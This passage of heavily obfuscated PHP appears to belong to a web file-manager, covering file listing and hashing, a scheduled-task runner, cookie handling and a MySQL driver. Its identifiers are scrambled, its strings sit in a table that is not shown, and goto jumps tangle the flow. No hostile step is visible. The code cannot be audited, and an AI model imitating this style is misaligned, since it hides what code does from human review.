$¥”ŠÉ“ =& $_SERVER[³·—™¤¢]; $ïİÍã‡ı = $this->fileNameAuto($this->pathFather($ìî‚ÉŞˆ), $ã…ËÀŞ); $ïİÍã‡ı = $this->iconvSystem($ïİÍã‡ı); $ìî‚ÉŞˆ = $this->iconvSystem($ìî‚ÉŞˆ); $ü³àÄô¸ = $this->pathFather($ìî‚ÉŞˆ); $Áš™äÎ« = rtrim($ü³àÄô¸, $¥”ŠÉ“[8]) . $¥”ŠÉ“[8] . $ïİÍã‡ı; $íï—ò—– = @rename($ìî‚ÉŞˆ, $Áš™äÎ«); $Áš™äÎ« = $this->iconvApp($Áš™äÎ«); return $íï—ò—– ? $this->getPathOuter($Áš™äÎ«) : !1; } public function size($Ğ‚ê÷œÆ) { $Ğ‚ê÷œÆ = $this->iconvSystem($Ğ‚ê÷œÆ); return filesize_64($Ğ‚ê÷œÆ); } public function info($³ó±ßÕ€) { $³ó±ßÕ€ = $this->iconvSystem($³ó±ßÕ€); if ($this->isFolder($³ó±ßÕ€)) { return $this->folderInfo($³ó±ßÕ€); } else { if ($this->isFile($³ó±ßÕ€)) { return $this->fileInfo($³ó±ßÕ€); } } return !1; } protected function infoChildren($ŒÍæƒÅ­, &$×¶‰¾Òé, $ù½Ï€¤× = true) { $´³ÕÍÍ =& $_SERVER[³·—™¤¢]; check_abort_echo(); $ŒÍæƒÅ­ = rtrim($ŒÍæƒÅ­, $´³ÕÍÍ[8]) . $´³ÕÍÍ[8]; if ($ù½Ï€¤×) { $ŒÍæƒÅ­ = $this->iconvSystem($ŒÍæƒÅ­); } if (!($©å«µÖñ = @opendir($ŒÍæƒÅ­))) { return; } while (($ùº¿ÛÏ• = readdir($©å«µÖñ)) !== !1) { if ($ùº¿ÛÏ• == $´³ÕÍÍ[10] || $ùº¿ÛÏ• == $´³ÕÍÍ[1397]) { continue; } $½ş›šÌ = $ŒÍæƒÅ­ . $ùº¿ÛÏ•; if (is_file($½ş›šÌ) || is_link($½ş›šÌ)) { $×¶‰¾Òé[$´³ÕÍÍ[77]]++; $×¶‰¾Òé[$´³ÕÍÍ[76]] += filesize_64($½ş›šÌ); } else { if (is_dir($½ş›šÌ)) { $×¶‰¾Òé[$´³ÕÍÍ[78]]++; $this->infoChildren($½ş›šÌ, $×¶‰¾Òé, !1); } } } closedir($©å«µÖñ); } private function folderInfo($‚•àö, $±ìŞ¢ÎÇ = false) { $ûŸƒØĞ =& $_SERVER[³·—™¤¢]; $‚•àö = rtrim($‚•àö, $ûŸƒØĞ[8]) . $ûŸƒØĞ[8]; $ôœáèÊœ = $this->iconvApp($this->pathThis($‚•àö)); if ($±ìŞ¢ÎÇ) { return array($ûŸƒØĞ[32] => $ôœáèÊœ, $ûŸƒØĞ[84] => $this->getPathOuter($‚•àö), $ûŸƒØĞ[33] => $ûŸƒØĞ[75]); } $…±µ€÷“ = array($ûŸƒØĞ[32] => $ôœáèÊœ, $ûŸƒØĞ[84] => $this->getPathOuter($‚•àö), $ûŸƒØĞ[33] => $ûŸƒØĞ[75], $ûŸƒØĞ[200] => @filectime($‚•àö), $ûŸƒØĞ[85] => @filemtime($‚•àö), $ûŸƒØĞ[1400] => @fileatime($‚•àö), $ûŸƒØĞ[1401] => is_readable($‚•àö), $ûŸƒØĞ[1402] => is_writable($‚•àö), $ûŸƒØĞ[1403] => get_mode($‚•àö)); return $…±µ€÷“; } private function fileInfo($•ßÎª“‹, $íêá¡¾ = false) { $¨î˜ŠºŸ =& $_SERVER[³·—™¤¢]; $ÓôÁæ‚¹ = $this->iconvApp($this->pathThis($•ßÎª“‹)); if ($íêá¡¾) { return array($¨î˜ŠºŸ[32] => $ÓôÁæ‚¹, $¨î˜ŠºŸ[84] => $this->getPathOuter($•ßÎª“‹), $¨î˜ŠºŸ[33] => $¨î˜ŠºŸ[199], $¨î˜ŠºŸ[76] => $this->size($•ßÎª“‹), $¨î˜ŠºŸ[174] => $this->ext($ÓôÁæ‚¹)); } $íí±ƒ¨õ = array($¨î˜ŠºŸ[32] => $ÓôÁæ‚¹, $¨î˜ŠºŸ[84] => $this->getPathOuter($•ßÎª“‹), $¨î˜ŠºŸ[33] => $¨î˜ŠºŸ[199], $¨î˜ŠºŸ[200] => @filectime($•ßÎª“‹), $¨î˜ŠºŸ[85] => @filemtime($•ßÎª“‹), $¨î˜ŠºŸ[1400] => @fileatime($•ßÎª“‹), $¨î˜ŠºŸ[76] => $this->size($•ßÎª“‹), $¨î˜ŠºŸ[174] => $this->ext($ÓôÁæ‚¹), $¨î˜ŠºŸ[1401] => is_readable($•ßÎª“‹), $¨î˜ŠºŸ[1402] => is_writable($•ßÎª“‹), $¨î˜ŠºŸ[1403] => get_mode($•ßÎª“‹)); return $íí±ƒ¨õ; } public function exist($Æ‚……ıÙ) { $Æ‚……ıÙ = $this->iconvSystem($Æ‚……ıÙ); return @file_exists($Æ‚……ıÙ); } public function isFile($éâŒ²êã) { $éâŒ²êã = $this->iconvSystem($éâŒ²êã); return @is_file($éâŒ²êã); } public function isFolder($İ¶ƒ´ŸÅ) { $İ¶ƒ´ŸÅ = $this->iconvSystem($İ¶ƒ´ŸÅ); return @is_dir($İ¶ƒ´ŸÅ); } public function listPath($™¯ÁûÜ«, $ñºüÅ´ = false) { $³†Í¦Ÿµ =& $_SERVER[³·—™¤¢]; $™¯ÁûÜ« = $this->iconvSystem($™¯ÁûÜ«); $™¯ÁûÜ« = rtrim($™¯ÁûÜ«, $³†Í¦Ÿµ[8]) . $³†Í¦Ÿµ[8]; $ÇƒÚùŒÅ = array($³†Í¦Ÿµ[82] => array(), $³†Í¦Ÿµ[83] => array()); if (!($£¸Ã¶²µ = @opendir($™¯ÁûÜ«))) { return $ÇƒÚùŒÅ; } while (($¥ÑÖµ‹ = readdir($£¸Ã¶²µ)) !== !1) { if ($¥ÑÖµ‹ == $³†Í¦Ÿµ[10] || $¥ÑÖµ‹ == $³†Í¦Ÿµ[1397]) { continue; } $ìµÈâ¨î = $™¯ÁûÜ« . $¥ÑÖµ‹; if (is_file($ìµÈâ¨î)) { $ÇƒÚùŒÅ[$³†Í¦Ÿµ[83]][] = $this->fileInfo($ìµÈâ¨î, $ñºüÅ´); } else { $ÇƒÚùŒÅ[$³†Í¦Ÿµ[82]][] = $this->folderInfo($ìµÈâ¨î, $ñºüÅ´); } } closedir($£¸Ã¶²µ); return $ÇƒÚùŒÅ; } public function listAll($¼•ê¾°·, &$ÃõãŠË = array()) { $±Õ¹ =& $_SERVER[³·—™¤¢]; $¼•ê¾°· = $this->iconvSystem($¼•ê¾°·); $¼•ê¾°· = rtrim($¼•ê¾°·, $±Õ¹[8]) . $±Õ¹[8]; if (!($î¶Õœ¿† = @opendir($¼•ê¾°·))) { return $ÃõãŠË; } while (($ÓÅëÖ‚ = readdir($î¶Õœ¿†)) !== !1) { if ($ÓÅëÖ‚ == $±Õ¹[10] || $ÓÅëÖ‚ == $±Õ¹[1397]) { continue; } $ˆÌ±í‰ = $¼•ê¾°· . $ÓÅëÖ‚; if (is_dir($ˆÌ±í‰) && !is_link($ˆÌ±í‰)) { $ÃõãŠË[] = array($±Õ¹[84] => $ˆÌ±í‰ . $±Õ¹[8], $±Õ¹[75] => 1, $±Õ¹[85] => @filemtime($ˆÌ±í‰), $±Õ¹[76] => 0); $this->listAll($ˆÌ±í‰, $ÃõãŠË); } else { $ÃõãŠË[] = array($±Õ¹[84] => $ˆÌ±í‰, $±Õ¹[75] => 0, $±Õ¹[85] => @filemtime($ˆÌ±í‰), $±Õ¹[76] => $this->size($ˆÌ±í‰)); } } closedir($î¶Õœ¿†); return $ÃõãŠË; } public function has($¯ñ€…ƒ¥, $ÉÁİÔÍ = false, $ëáÏ£ = true) { $Ğ«†¯Ç =& $_SERVER[³·—™¤¢]; $¯ñ€…ƒ¥ = $this->iconvSystem($¯ñ€…ƒ¥); $¯ñ€…ƒ¥ = rtrim($¯ñ€…ƒ¥, $Ğ«†¯Ç[8]) . $Ğ«†¯Ç[8]; if (!($·ÍÖ¿”ö = @opendir($¯ñ€…ƒ¥))) { return !1; } $‚ÓïßÒÙ = 0; $Å²“ÔÛÂ = 0; $ØÃ¹ÊŠ = 0; while (($‚êŠğÆÙ = readdir($·ÍÖ¿”ö)) !== !1) { if ($‚êŠğÆÙ == $Ğ«†¯Ç[10] || $‚êŠğÆÙ == $Ğ«†¯Ç[1397]) { continue; } $ Ş›ª¨ = $¯ñ€…ƒ¥ . $‚êŠğÆÙ; if ($ÉÁİÔÍ) { $ØÃ¹ÊŠ++; if (@is_file($ Ş›ª¨)) { $‚ÓïßÒÙ++; } else { $Å²“ÔÛÂ++; } if ($ØÃ¹ÊŠ > 10000) { break; } continue; } if ($ëáÏ£) { if (@is_file($ Ş›ª¨)) { return !0; } } else { if (@is_dir($ Ş›ª¨ . $Ğ«†¯Ç[8])) { return !0; } } } closedir($·ÍÖ¿”ö); if ($ÉÁİÔÍ) { return array($Ğ«†¯Ç[207] => $‚ÓïßÒÙ, $Ğ«†¯Ç[208] => $Å²“ÔÛÂ); } return !1; } public function hashSimple($—ƒœà«Î) { $ğ×æ¹Â­ =& $_SERVER[³·—™¤¢]; if (!$—ƒœà«Î) { return md5($ğ×æ¹Â­[12]); } $—ƒœà«Î = $this->iconvSystem($—ƒœà«Î); $Ø°Óõü¬ = $this->size($—ƒœà«Î); $¶©Òğãí = 200; $…Œõññİ = 50; if ($Ø°Óõü¬ <= $¶©Òğãí * $…Œõññİ) { return $this->hashMd5($—ƒœà«Î) . $Ø°Óõü¬; } $§®•œÂÄ = $ğ×æ¹Â­[12]; $Ú§µŞ°ä = intval($Ø°Óõü¬ / $…Œõññİ); $·£¨¨ÜŞ = fopen($—ƒœà«Î, $ğ×æ¹Â­[1404]); if (!$·£¨¨ÜŞ) { return $§®•œÂÄ; } for ($´Ê¤ùª½ = 0; $´Ê¤ùª½ < $…Œõññİ; $´Ê¤ùª½++) { fseek_64($·£¨¨ÜŞ, $Ú§µŞ°ä * $´Ê¤ùª½); $§®•œÂÄ .= fread($·£¨¨ÜŞ, $¶©Òğãí); } fseek_64($·£¨¨ÜŞ, $Ø°Óõü¬ - $¶©Òğãí); $§®•œÂÄ .= fread($·£¨¨ÜŞ, $¶©Òğãí); fclose($·£¨¨ÜŞ); return md5($§®•œÂÄ) . $Ø°Óõü¬; } public function getContent($“ìı“¤ş) { $“ìı“¤ş = $this->iconvSystem($“ìı“¤ş); return file_get_contents($“ìı“¤ş); } public function setContent($ˆ•–ß›, $»¢ó‘³ş = '') { $ˆ•–ß› = $this->iconvSystem($ˆ•–ß›); $Ü£èÑôÄ = @file_put_contents($ˆ•–ß›, $»¢ó‘³ş, LOCK_EX); clearstatcache(); @chmod($ˆ•–ß›, $this->pathAuth); return $Ü£èÑôÄ === !1 ? !1 : !0; } public function fileSubstr($ğ«‹Ü”¶, $»—· ®Ö = 0, $øİ¼‹® = false) { $…É…›‰š =& $_SERVER[³·—™¤¢]; $ğ«‹Ü”¶ = $this->iconvSystem($ğ«‹Ü”¶); if ($øİ¼‹® === !1) { $øİ¼‹® = $this->size($ğ«‹Ü”¶); } if ($øİ¼‹® <= 0) { return $…É…›‰š[12]; } $·Ü»­ó = fopen($ğ«‹Ü”¶, $…É…›‰š[1404]); if (!$·Ü»­ó) { return !1; } fseek_64($·Ü»­ó, $»—· ®Ö); $²³ıÅ¥ = fread($·Ü»­ó, $øİ¼‹®); fclose($·Ü»­ó); return $²³ıÅ¥; } public function upload($®£Ô¥İ, $¥üß ‰Ü, $Í¹¹ëå¡ = false, $¢é¸Ö¢ = REPEAT_REPLACE) { if ($Í¹¹ëå¡) { return $this->moveFile($¥üß ‰Ü, $®£Ô¥İ); } return $this->copyFile($¥üß ‰Ü, $®£Ô¥İ); } public function setModifyTime($˜×œÃ¬…, $Ä•°Óë¼ = '') { @touch($˜×œÃ¬…, intval($Ä•°Óë¼)); } public function download($İ³êŒ©à, $µ†¥Ö’¦) { return $this->iconvSystem($İ³êŒ©à); } } goto a‚ÕŒ¹…¥ƒ; F¶¦Šß‹Ñ: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $é¾•éÉ¤ =& $_SERVER[³·—™¤¢]; if (self::valueGet($é¾•éÉ¤[770]) != $é¾•éÉ¤[88]) { return; } if (self::valueGet($é¾•éÉ¤[1639]) == $é¾•éÉ¤[88]) { $…ÂŸ³Ä¶ = self::valueGet($é¾•éÉ¤[1640]); if (time() - $…ÂŸ³Ä¶ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$é¾•éÉ¤[1641]] = 1; self::valueSet($é¾•éÉ¤[1639], $é¾•éÉ¤[88]); self::log($é¾•éÉ¤[1642] . ACTION . $é¾•éÉ¤[1643]); Session::$data = array(); Session::$sessionSign = $é¾•éÉ¤[12]; $GLOBALS[$é¾•éÉ¤[503]] = 1; Hook::bind($é¾•éÉ¤[1644], $é¾•éÉ¤[1645]); $ êç’¦ä = 0; while (!0) { self::cacheClear(); if (self::valueGet($é¾•éÉ¤[770]) != $é¾•éÉ¤[88]) { self::valueSet($é¾•éÉ¤[1639], $é¾•éÉ¤[197]); self::log($é¾•éÉ¤[1646]); die; } $¬ »İéÂ = time(); if ($¬ »İéÂ - $ êç’¦ä >= 60) { self::valueSet(array($é¾•éÉ¤[1639] => $é¾•éÉ¤[88], $é¾•éÉ¤[1640] => $¬ »İéÂ), !1); $ êç’¦ä = $¬ »İéÂ; } if (!file_exists(USER_SYSTEM . $é¾•éÉ¤[1647])) { self::valueSet(array($é¾•éÉ¤[1639] => $é¾•éÉ¤[197], $é¾•éÉ¤[770] => $é¾•éÉ¤[197]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ÃöÊŸĞ˜ =& $_SERVER[³·—™¤¢]; http_close(); self::valueSet($ÃöÊŸĞ˜[770], $ÃöÊŸĞ˜[197]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÃöÊŸĞ˜[1639] => $ÃöÊŸĞ˜[197], $ÃöÊŸĞ˜[770] => $ÃöÊŸĞ˜[88]), !1); } public static function taskSwitch() { $Óğ¡ŞîÒ =& $_SERVER[³·—™¤¢]; $±ÁÔ×ˆ„ = self::valueGet($Óğ¡ŞîÒ[770]) == $Óğ¡ŞîÒ[88] ? $Óğ¡ŞîÒ[197] : $Óğ¡ŞîÒ[88]; self::valueSet($Óğ¡ŞîÒ[770], $±ÁÔ×ˆ„); } public static function shutdownEvent() { $‹â•á¶İ =& $_SERVER[³·—™¤¢]; self::valueSet($‹â•á¶İ[1639], $‹â•á¶İ[197]); self::log($‹â•á¶İ[1648]); } public static function config($šÃ¼´°, $¶É©÷¡À) { self::valueSet($_SERVER[³·—™¤¢][770], $šÃ¼´°); } private static function taskRunAll() { $æÍÕñÂ =& $_SERVER[³·—™¤¢]; $ÜÜ˜‹Ë = timeFloat(); $…›¤Ëñ = Model($æÍÕñÂ[1649])->listData(); $ŞÉü„†± = count($…›¤Ëñ); for ($¹ÀÄ€Ÿò = 0; $¹ÀÄ€Ÿò < $ŞÉü„†±; $¹ÀÄ€Ÿò++) { $àëÁ‚± = $…›¤Ëñ[$¹ÀÄ€Ÿò]; if (!$àëÁ‚±[$æÍÕñÂ[399]] || $àëÁ‚±[$æÍÕñÂ[1650]] != $æÍÕñÂ[88]) { continue; } if (!self::taskTimeCheck($àëÁ‚±)) { continue; } self::taskRun($àëÁ‚±); } Hook::trigger($æÍÕñÂ[1651]); self::taskQueueRun($ÜÜ˜‹Ë); } private static function taskQueueRun($Ë ¾‡ìÈ) { $ûÄ§ Şï = 10; while (!0) { $ãú”·€É = TaskQueue::run(); if ($ãú”·€É === !1) { break; } if (timeFloat() - $Ë ¾‡ìÈ >= $ûÄ§ Şï) { break; } } } private static function taskTimeCheck($ÀåÄ‚Ä) { $ºÑÄ”Ú· =& $_SERVER[³·—™¤¢]; $”æ¼ÆöÄ = json_decode($ÀåÄ‚Ä[$ºÑÄ”Ú·[203]], !0); $¹“î‘ò¯ = intval($ÀåÄ‚Ä[$ºÑÄ”Ú·[1640]]); $¥ß•¹¤ê = strtotime($ºÑÄ”Ú·[1652] . $”æ¼ÆöÄ[$ºÑÄ”Ú·[1653]] . $ºÑÄ”Ú·[1654]) - strtotime($ºÑÄ”Ú·[1655]); $Ë¡Õè°æ = time() - strtotime(date($ºÑÄ”Ú·[1656]) . $ºÑÄ”Ú·[1657]); $³Ù›Ä—± = $Ë¡Õè°æ >= $¥ß•¹¤ê && $Ë¡Õè°æ <= $¥ß•¹¤ê + 3600; switch ($”æ¼ÆöÄ[$ºÑÄ”Ú·[33]]) { case $ºÑÄ”Ú·[1658]: if (time() - $¹“î‘ò¯ < 3600 * 24 * 30) { return !1; } if ($”æ¼ÆöÄ[$ºÑÄ”Ú·[1658]] == date($ºÑÄ”Ú·[1659]) && $³Ù›Ä—±) { return !0; } break; case $ºÑÄ”Ú·[1660]: if (time() - $¹“î‘ò¯ < 3600 * 24 * 7) { return !1; } $²„óãçÑ = date($ºÑÄ”Ú·[1661]) == 0 ? 7 : date($ºÑÄ”Ú·[1661]); if ($”æ¼ÆöÄ[$ºÑÄ”Ú·[1660]] == $²„óãçÑ && $³Ù›Ä—±) { return !0; } break; case $ºÑÄ”Ú·[1653]: if (time() - $¹“î‘ò¯ < 3600 * 24) { return !1; } if ($³Ù›Ä—±) { return !0; } break; case $ºÑÄ”Ú·[1662]: if (time() - $¹“î‘ò¯ >= floatval($”æ¼ÆöÄ[$ºÑÄ”Ú·[1662]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $‚¤®èÒ =& $_SERVER[³·—™¤¢]; static $ê‡ ˜È÷ = 0; $°îñ«­— = 300; if (!$ê‡ ˜È÷) { $ê‡ ˜È÷ = time(); } if (time() - $ê‡ ˜È÷ < $°îñ«­—) { return; } $ê‡ ˜È÷ = time(); $áÀ Ñ = Model($‚¤®èÒ[513])->db($‚¤®èÒ[12]); if ($áÀ Ñ) { $áÀ Ñ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($‚¤®èÒ[1663], $‚¤®èÒ[1664]); die; } } public static function taskRun($¢Í¯î¿ö) { $©«µş£ =& $_SERVER[³·—™¤¢]; self::log($©«µş£[1665] . $¢Í¯î¿ö[$©«µş£[399]] . $©«µş£[1666] . $¢Í¯î¿ö[$©«µş£[32]] . $©«µş£[1667] . $¢Í¯î¿ö[$©«µş£[1668]]); Model($©«µş£[1649])->run($¢Í¯î¿ö[$©«µş£[399]]); $Á¡¨•‰¦ = timeFloat(); $­¥ŸÑúì = $©«µş£[12]; switch ($¢Í¯î¿ö[$©«µş£[33]]) { case $©«µş£[307]: $şè‡º = url_request($¢Í¯î¿ö[$©«µş£[1668]], $©«µş£[230], !1, !1, !1, !1, 10); if ($şè‡º[$©«µş£[770]]) { $­¥ŸÑúì = strlen($şè‡º[$©«µş£[1216]]); } break; case $©«µş£[229]: $­¥ŸÑúì = Hook::apply($¢Í¯î¿ö[$©«µş£[1668]]); default: break; } Model($©«µş£[1669])->add(array($©«µş£[1670] => $©«µş£[12], $©«µş£[1671] => $©«µş£[197], $©«µş£[33] => $©«µş£[1672] . $¢Í¯î¿ö[$©«µş£[399]], $©«µş£[1673] => json_encode(array($©«µş£[32] => $¢Í¯î¿ö[$©«µş£[32]], $©«µş£[1674] => timeFloat() - $Á¡¨•‰¦, $©«µş£[293] => $­¥ŸÑúì)))); $³’Ö¹Œ€ = $­¥ŸÑúì ? $©«µş£[1675] . $­¥ŸÑúì : $©«µş£[12]; self::log($©«µş£[1676] . $¢Í¯î¿ö[$©«µş£[399]] . $©«µş£[164] . $³’Ö¹Œ€); return !0; } private static function valueGet($‚–¯ø‰Ÿ) { $°—¬é•¬ =& $_SERVER[³·—™¤¢]; $êĞÎ¦ = $°—¬é•¬[1677]; $­º²¿˜ª = Model($°—¬é•¬[435])->get($‚–¯ø‰Ÿ, $êĞÎ¦); if (is_null($­º²¿˜ª)) { Model($°—¬é•¬[435])->set($°—¬é•¬[770], $°—¬é•¬[88], $êĞÎ¦); Model($°—¬é•¬[435])->set($°—¬é•¬[1639], $°—¬é•¬[197], $êĞÎ¦); $­º²¿˜ª = Model($°—¬é•¬[435])->get($‚–¯ø‰Ÿ, $êĞÎ¦); } return $­º²¿˜ª; } private static function valueSet($ó¸‡Ã, $§Ù÷Äé²) { $¤Ôùˆˆü =& $_SERVER[³·—™¤¢]; $’šîğ„• = $¤Ôùˆˆü[1678]; CacheLock::lock($’šîğ„•); $Ğ§È¸©£ = Model($¤Ôùˆˆü[435])->set($ó¸‡Ã, $§Ù÷Äé², $¤Ôùˆˆü[1677]); CacheLock::unlock($’šîğ„•); return $Ğ§È¸©£; } protected static function log($âÛ²¿¸Ş) { write_log($âÛ²¿¸Ş, $_SERVER[³·—™¤¢][1664]); } private static function cacheClear() { $Óä‰°³› =& $_SERVER[³·—™¤¢]; Cache::clearMemory(Model($Óä‰°³›[435])->cacheKey($Óä‰°³›[1677])); Cache::clearMemory(Model($Óä‰°³›[435])->cacheKey($Óä‰°³›[1679])); Model($Óä‰°³›[1649])->cacheClear(); self::closeDatabase(); } } $_file = $_SERVER[$_SERVER[³·—™¤¢][934]]; $_size = $_SERVER[³·—™¤¢][982]; goto e•Ë•™íœ; bÎ—ÁÍÉÛâ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($„€Ò”ü = '', $§Ç¶„òÒ = 0) { if (is_string($„€Ò”ü) && $„€Ò”ü != $_SERVER[³·—™¤¢][12]) { $this->prefix = $„€Ò”ü; } if (is_numeric($§Ç¶„òÒ) && $§Ç¶„òÒ > 0) { $this->expire = $§Ç¶„òÒ; } } public static function getInstance() { static $«ı¸Ûû±; if ($«ı¸Ûû± === null) { $«ı¸Ûû± = new self(); } return $«ı¸Ûû±; } private static $cookieDisable = false; public static function disable($“‚¦éÀù) { self::$cookieDisable = $“‚¦éÀù; } private static $sameCookieSet = array(); public static function set($äğ‚¾ï, $™ı­ƒ©ù, $×Û‹ÛÒ = 0, $æàÙ‘¯ä = false, $µ­ÛÛÍ = false) { $«º¡…„ =& $_SERVER[³·—™¤¢]; if (self::$cookieDisable) { return; } if (!$×Û‹ÛÒ) { $×Û‹ÛÒ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$äğ‚¾ï]) && self::$sameCookieSet[$äğ‚¾ï] == $™ı­ƒ©ù . $×Û‹ÛÒ) { return; } self::$sameCookieSet[$äğ‚¾ï] = $™ı­ƒ©ù . $×Û‹ÛÒ; if (!$µ­ÛÛÍ) { $µ­ÛÛÍ = str_replace(HOST, $«º¡…„[12], APP_HOST); $µ­ÛÛÍ = _get($GLOBALS, $«º¡…„[902], $µ­ÛÛÍ); } $¡ğå–É = $«º¡…„[12]; setcookie($äğ‚¾ï, $™ı­ƒ©ù, time() + $×Û‹ÛÒ, $«º¡…„[8] . trim($µ­ÛÛÍ, $«º¡…„[8]) . $¡ğå–É, !1, !1, $æàÙ‘¯ä); } public static function setSafe($¤»ÔŸÑà, $”˜òó®Î, $ßìßİªÖ = 0) { self::set($¤»ÔŸÑà, $”˜òó®Î, $ßìßİªÖ, !0); } public static function get($è»µÉ©ù) { static $µçÏŞŒ = false; if (!$µçÏŞŒ) { self::initHeaderCookie(); $µçÏŞŒ = !0; } return isset($_COOKIE[$è»µÉ©ù]) ? $_COOKIE[$è»µÉ©ù] : !1; } private static function initHeaderCookie() { $ ™Î¢‘‚ =& $_SERVER[³·—™¤¢]; if (!isset($_SERVER[$ ™Î¢‘‚[903]]) || !$_SERVER[$ ™Î¢‘‚[903]]) { return; } $ÜÒ¥È¹ü = explode($ ™Î¢‘‚[71], $_SERVER[$ ™Î¢‘‚[903]]); foreach ($ÜÒ¥È¹ü as $×¼ƒããñ) { $×¼ƒããñ = explode($ ™Î¢‘‚[904], $×¼ƒããñ); if (count($×¼ƒããñ) != 2 || !isset($×¼ƒããñ[1])) { continue; } $_COOKIE[trim($×¼ƒããñ[0])] = trim($×¼ƒããñ[1]); } } public static function remove($‰«ÊéŞÂ, $Ğ°ÊÇâ¼ = false) { unset($_COOKIE[$‰«ÊéŞÂ]); self::set($‰«ÊéŞÂ, $_SERVER[³·—™¤¢][12], 1, $Ğ°ÊÇâ¼); } } class DbMysql extends Db { public function __construct($Şêüª†• = '') { $ÙóÌ½°ë =& $_SERVER[³·—™¤¢]; if (!extension_loaded($ÙóÌ½°ë[824])) { think_exception(think_lang($ÙóÌ½°ë[14]) . $ÙóÌ½°ë[905]); } if (!empty($Şêüª†•)) { $this->config = $Şêüª†•; if (empty($this->config[$ÙóÌ½°ë[17]])) { $this->config[$ÙóÌ½°ë[17]] = $ÙóÌ½°ë[12]; } } } public function connect($è®°Ó‹û = '', $¾¨»²† = 0, $ æÛÊÒŒ = false) { $ÒŸÀÜóñ =& $_SERVER[³·—™¤¢]; if (!isset($this->linkID[$¾¨»²†])) { if (empty($è®°Ó‹û)) { $è®°Ó‹û = $this->config; } $‹ÃÔĞ™ = $è®°Ó‹û[$ÒŸÀÜóñ[906]] . ($è®°Ó‹û[$ÒŸÀÜóñ[907]] ? "\x3a{$è®°Ó‹û[$ÒŸÀÜóñ[907]]}" : $ÒŸÀÜóñ[12]); $¦°Ã»å = !empty($è®°Ó‹û[$ÒŸÀÜóñ[17]][$ÒŸÀÜóñ[18]]) ? $è®°Ó‹û[$ÒŸÀÜóñ[17]][$ÒŸÀÜóñ[18]] : $this->pconnect; if ($¦°Ã»å) { $this->linkID[$¾¨»²†] = mysql_pconnect($‹ÃÔĞ™, $è®°Ó‹û[$ÒŸÀÜóñ[908]], $è®°Ó‹û[$ÒŸÀÜóñ[909]], 131072); } else { $this->linkID[$¾¨»²†] = mysql_connect($‹ÃÔĞ™, $è®°Ó‹û[$ÒŸÀÜóñ[908]], $è®°Ó‹û[$ÒŸÀÜóñ[909]], !0, 131072); } if (!$this->linkID[$¾¨»²†] || !empty($è®°Ó‹û[$ÒŸÀÜóñ[21]]) && !mysql_select_db($è®°Ó‹û[$ÒŸÀÜóñ[21]], $this->linkID[$¾¨»²†])) { think_exception(mysql_error()); } $—¡’æ¦ = mysql_get_server_info($this->linkID[$¾¨»²†]); mysql_query($ÒŸÀÜóñ[910] . think_config($ÒŸÀÜóñ[911]) . $ÒŸÀÜóñ[58], $this->linkID[$¾¨»²†]); if ($—¡’æ¦ > $ÒŸÀÜóñ[912]) { mysql_query($ÒŸÀÜóñ[913], $this->linkID[$¾¨»²†]); } $this->connected = !0; if (1 != think_config($ÒŸÀÜóñ[22])) { unset($this->config); } } return $this->linkID[$¾¨»²†]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($‡Ù†¥”û) { $è¡Ôê— =& $_SERVER[³·—™¤¢]; if (0 === stripos($‡Ù†¥”û, $è¡Ôê—[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‡Ù†¥”û; if ($this->queryID) { $this->free(); } think_action_status($è¡Ôê—[23], 1); think_status($è¡Ôê—[24]); $this->queryID = mysql_query($‡Ù†¥”û, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ã‡˜Â³) { $¨¤ıäÏÃ =& $_SERVER[³·—™¤¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ã‡˜Â³; if ($this->queryID) { $this->free(); } think_action_status($¨¤ıäÏÃ[25], 1); think_status($¨¤ıäÏÃ[24]); $åÖ˜§É = mysql_query($ã‡˜Â³, $this->_linkID); $this->debug(); if (!1 === $åÖ˜§É) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[³·—™¤¢][914], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $­„˜îÓş = mysql_query($_SERVER[³·—™¤¢][915], $this->_linkID); $this->transTimes = 0; if (!$­„˜îÓş) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ºòË™™— = mysql_query($_SERVER[³·—™¤¢][916], $this->_linkID); $this->transTimes = 0; if (!$ºòË™™—) { $this->error(); return !1; } } return !0; } private function getAll() { $Ç–Ÿóß‹ = array(); if ($this->numRows > 0) { while ($˜ï±üÆÑ = mysql_fetch_assoc($this->queryID)) { $Ç–Ÿóß‹[] = $˜ï±üÆÑ; } mysql_data_seek($this->queryID, 0); } return $Ç–Ÿóß‹; } public function getFields($„êÑï§Œ) { $ô¤¬Ô¸ù =& $_SERVER[³·—™¤¢]; $½‰ñüÖ = $this->query($ô¤¬Ô¸ù[917] . $this->parseKey($„êÑï§Œ)); $ÑşİÃÅ = array(); if ($½‰ñüÖ) { foreach ($½‰ñüÖ as $¯áæõŞç => $ß¶ùé±™) { $ÑşİÃÅ[$ß¶ùé±™[$ô¤¬Ô¸ù[31]]] = array($ô¤¬Ô¸ù[32] => $ß¶ùé±™[$ô¤¬Ô¸ù[31]], $ô¤¬Ô¸ù[33] => $ß¶ùé±™[$ô¤¬Ô¸ù[34]], $ô¤¬Ô¸ù[35] => (bool) (strtoupper($ß¶ùé±™[$ô¤¬Ô¸ù[36]]) === $ô¤¬Ô¸ù[918]), $ô¤¬Ô¸ù[37] => $ß¶ùé±™[$ô¤¬Ô¸ù[38]], $ô¤¬Ô¸ù[39] => strtolower($ß¶ùé±™[$ô¤¬Ô¸ù[40]]) == 